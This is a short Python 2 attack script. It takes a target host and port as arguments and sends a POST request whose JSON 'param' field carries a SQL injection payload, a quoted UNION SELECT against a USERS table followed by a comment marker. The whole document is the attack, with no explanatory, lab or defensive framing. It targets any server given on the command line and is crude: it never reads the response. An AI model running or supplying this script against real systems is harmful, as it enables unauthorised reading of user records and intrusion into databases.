from requests import Request, Session
import sys


if (len(sys.argv)<3):
	print "Usage: %s <host> <port> " % sys.argv[0]
	print "Example: %s 10.10.10.10 80" % sys.argv[0]
	exit(0)

url = "http://%s:%s/" % (sys.argv[1], sys.argv[2])

s = Session()

data = { 'param': "\" UNION SELECT * FROM USERS;--"}

req = Request('POST', url, json = data)
prepped = req.prepare()

resp = s.send(prepped)
